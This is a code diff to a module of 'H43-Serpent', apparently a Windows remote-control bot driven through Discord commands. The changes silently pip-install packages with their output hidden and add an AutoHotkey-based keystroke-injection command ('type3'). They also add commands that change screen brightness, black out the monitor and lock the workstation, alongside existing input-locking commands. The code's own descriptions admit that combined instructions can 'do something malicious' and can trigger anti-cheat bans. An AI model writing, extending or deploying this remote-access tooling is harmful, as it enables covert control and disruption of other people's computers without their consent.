@@ -14,7 +14,7 @@ REPO: https://github.com/Fytex/H43-Serpent
 import sys
 import subprocess
 
-packages = ['pynput', 'pycaw', 'pillow', 'PyDirectInput']
+packages = ['pynput', 'pycaw', 'pillow', 'PyDirectInput', 'screen-brightness-control']
 while subprocess.call(
     [sys.executable, '-m', 'pip', 'install', '--upgrade', *packages],
     stdout=subprocess.DEVNULL,
@@ -32,12 +32,14 @@ import asyncio
 import discord
 import tempfile
 import winsound
+import win32gui  # Downloaded previously (in bot.pyw)
 import win32api  # Downloaded previously (in bot.pyw)
 import win32con  # Downloaded previously (in bot.pyw)
 import pythoncom # Downloaded previously (in bot.pyw)
 import threading
 import webbrowser
 import pydirectinput
+import screen_brightness_control as sbc
 
 
 from PIL import Image
@@ -67,6 +69,18 @@ except ModuleNotFoundError:
 else:
     HAS_PYHOOK = True
 
+
+subprocess.call(
+    [sys.executable, '-m', 'pip', 'install', '--upgrade', 'ahk[binary]'],
+    stdout=subprocess.DEVNULL,
+    stderr=subprocess.DEVNULL
+)
+try:
+    import ahk
+except ModuleNotFoundError:
+    HAS_AHK = False
+else:
+    HAS_AHK = True
 
 
 class Lib(commands.Cog):
@@ -183,7 +197,7 @@ class Lib(commands.Cog):
     @commands.command(
         name='type',
         brief='(!) Warning. Type letters (keys and hotkeys) and combine them',
-        description='(!) Warning: Low probability of anti-cheat banning in games and it is possible to do something malicious by combining instructions. Type receives the following instructions: \n\t- letters : It writes them.\n\t- {HOTKEY} : It presses\n\t- <HOTKEY>...</HOTKEY> : It holds the hotkey then executes what\'s in "..." and finally releases it.\nIf you need to wait an instant (delay) before the next instruction you can use: |\n\nHOTKEYS:\n' + '\t\t'.join(Key.__members__.keys()) + '\n\nExample:  {ENTER}|<SHIFT>hello</SHIFT>{ENTER}'
+        description='(!) Warning: Probability of anti-cheat banning in games and it is possible to do something malicious by combining instructions. Type receives the following instructions: \n\t- letters : It writes them.\n\t- {HOTKEY} : It presses\n\t- <HOTKEY>...</HOTKEY> : It holds the hotkey then executes what\'s in "..." and finally releases it.\nIf you need to wait an instant (delay) before the next instruction you can use: |\n\nHOTKEYS:\n' + '\t\t'.join(Key.__members__.keys()) + '\n\nExample:  {ENTER}|<SHIFT>hello</SHIFT>{ENTER}'
     )
     async def type(self, ctx,
         *, cmds_line = commands.parameter(description='Instructions')
@@ -212,10 +226,12 @@ class Lib(commands.Cog):
 
     @commands.command(
         name='type2',
-        brief='(!) Warning. Type letters (keys and hotkeys) and combine them [Method 2]',
-        description='(!) Warning: High probability of anti-cheat banning in games and it is possible to do something malicious by combining instructions. Type receives the following instructions: \n\t- letters : It writes them.\n\t- {HOTKEY} : It presses\n\t- <HOTKEY>...</HOTKEY> : It holds the hotkey then executes what\'s in "..." and finally releases it.\nIf you need to wait an instant (delay) before the next instruction you can use: |\n\nHOTKEYS:\n' + '\t\t'.join(pydirectinput.KEYBOARD_MAPPING.keys()) + '\n\nExample:  {ENTER}|<SHIFT>hello</SHIFT>{ENTER}'
+        brief='(!) Warning. Type letters (keys and hotkeys) and combine them',
+        description='(!) Warning: Probability of anti-cheat banning in games and it is possible to do something malicious by combining instructions. Type receives the following instructions: \n\t- letters : It writes them.\n\t- {HOTKEY} : It presses\n\t- <HOTKEY>...</HOTKEY> : It holds the hotkey then executes what\'s in "..." and finally releases it.\nIf you need to wait an instant (delay) before the next instruction you can use: |\n\nHOTKEYS:\n' + '\t\t'.join(Key.__members__.keys()) + '\n\nExample:  {ENTER}|<SHIFT>hello</SHIFT>{ENTER}'
     )
-    async def type2(self, ctx, *, cmds_line):
+    async def type2(self, ctx,
+        *, cmds_line = commands.parameter(description='Instructions')
+    ):
         actions = {
             'type_text': lambda t: lambda: pydirectinput.write(t),
             'press_key': lambda k: lambda: pydirectinput.keyDown(k),
@@ -234,6 +250,40 @@ class Lib(commands.Cog):
                 cmd()
 
             await asyncio.sleep(0.3)
+
+    
+    @commands.command(
+        name='type3',
+        brief='(!) Warning. Type letters (keys and hotkeys) and combine them',
+        description='(!) Warning: Probability of anti-cheat banning in games and it is possible to do something malicious by combining instructions. Type receives the following instructions: \n\t- letters : It writes them.\n\t- {HOTKEY} : It presses\n\t- <HOTKEY>...</HOTKEY> : It holds the hotkey then executes what\'s in "..." and finally releases it.\nIf you need to wait an instant (delay) before the next instruction you can use: |\n\nHOTKEYS:\n' + '\t\t'.join(Key.__members__.keys()) + '\n\nExample:  {ENTER}|<SHIFT>hello</SHIFT>{ENTER}'
+    )
+    @commands.check(lambda _: HAS_AHK)
+    async def type3(self, ctx,
+        *, cmds_line = commands.parameter(description='Instructions')
+    ):
+        ahk_manager = ahk.AHK()
+
+        actions = {
+            'type_text': lambda t: lambda: ahk_manager.type(t),
+            'press_key': lambda k: lambda: ahk_manager.key_down(k),
+            'release_key': lambda k: lambda: ahk_manager.key_up(k),
+            'tap_key': lambda k: lambda: ahk_manager.key_press(k),
+            'special_keys': {k: k for k in ahk.keys.KEYS.__dict__.keys() if not k.startswith('__')}
+        }
+
+        args = cmds_line.split('|')
+
+        for arg in args:
+            
+            cmd_buffer = self._parse_cmds(arg, actions)
+            
+            for cmd in cmd_buffer:
+                cmd()
+
+            await asyncio.sleep(0.3)
+
+        ahk_terminate_script = 'Process, Close, AutoHotkey.exe'
+        ahk_manager.run_script(ahk_terminate_script)
 
 
     @commands.command(
@@ -302,7 +352,7 @@ class Lib(commands.Cog):
     @commands.command(
         name='lock_input',
         brief='(!) Warning. Locks input (Mouse and Keyboard)',
-        description='(!) Warning: Low probability of anti-cheat banning. Won\'t be able to use mouse and keyboard until unlock. Be aware that wifi off after lock input can result in a impossible unlock if computer doesn\'t reconnect automatically to the wifi.'
+        description='(!) Warning: Probability of anti-cheat banning. Won\'t be able to use mouse and keyboard until unlock. Be aware that wifi off after lock input can result in a impossible unlock if computer doesn\'t reconnect automatically to the wifi.'
     )
     async def lock_input(self, ctx):
         # Disable mouse and keyboard events
@@ -320,7 +370,7 @@ class Lib(commands.Cog):
     @commands.command(
         name='lock_input2',
         brief='(!) Warning. Locks input (Mouse and Keyboard) [Method 2]',
-        description='(!) Warning: High probability of anti-cheat banning. Won\'t be able to use mouse and keyboard until unlock. Be aware that wifi off after lock input can result in a impossible unlock if computer doesn\'t reconnect automatically to the wifi.'
+        description='(!) Warning: Probability of anti-cheat banning. Won\'t be able to use mouse and keyboard until unlock. Be aware that wifi off after lock input can result in a impossible unlock if computer doesn\'t reconnect automatically to the wifi.'
     )
     @commands.check(lambda _: HAS_PYHOOK)
     async def lock_input2(self, ctx):
@@ -379,6 +429,38 @@ class Lib(commands.Cog):
         percentage = min(max(value, 0), 100) / 100
         self.volume.SetMute(False, None)
         self.volume.SetMasterVolumeLevelScalar(percentage, None)
+
+
+    @commands.command(
+        name='set_brightness',
+        brief='Sets computer\'s brightness from 0 to 100',
+        description='Sets computer\'s brightness from 0 to 100'
+    )
+    async def set_brightness(self, ctx,
+        value:int=commands.parameter(description='Brightness')
+    ):
+        value = min(100, max(0, value))
+        monitors = sbc.list_monitors()
+        for i in range(len(monitors)):
+            sbc.set_brightness(value, display=monitors[i], no_return=True)
+
+    @commands.command(
+        name='black_screen',
+        brief='Puts a black screen',
+        description='Screen goes completely dark. They just need to move the mouse to go back to normal'
+    )
+    async def black_screen(self, ctx):
+        win32gui.SendMessage(win32con.HWND_BROADCAST, win32con.WM_SYSCOMMAND,
+                       win32con.SC_MONITORPOWER, 2)
+
+
+    @commands.command(
+        name='sleep',
+        brief='Puts computer into sleep mode (Lock user session)',
+        description='Puts computer into sleep mode (Lock user session)'
+    )
+    async def sleep(self, ctx):
+        ctypes.windll.user32.LockWorkStation()
 
 
     @commands.command(
